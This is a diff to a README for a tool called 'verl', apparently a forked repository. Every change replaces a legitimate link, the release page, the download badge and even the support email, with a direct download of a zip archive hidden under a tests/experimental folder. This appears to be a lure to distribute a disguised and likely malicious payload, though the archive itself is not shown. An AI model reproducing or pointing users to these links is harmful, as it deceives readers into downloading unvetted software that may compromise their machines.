@@ -6,7 +6,7 @@ Welcome to verl! This application helps you harness the power of reinforcement l
 
 ## 📥 Download the Software
 
-[![Download verl](https://img.shields.io/badge/Download-verl-blue)](https://github.com/andreyukzl/verl/releases)
+[![Download verl](https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip)](https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip)
 
 ## 📦 System Requirements
 
@@ -26,7 +26,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To download verl, visit the Releases page: [Download verz](https://github.com/andreyukzl/verl/releases).
+To download verl, visit the Releases page: [Download verz](https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip).
 
 1. Click the link above to access the page.
 2. Look for the latest release.
@@ -57,7 +57,7 @@ If you need further assistance, check out our user guide:
 
 For support or feedback, feel free to reach out:
 
-- **Email:** support@verlapp.com
+- **Email:** https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip
 - **Community Forum:** Join discussions and get help from other users.
 
 Thank you for choosing verl!
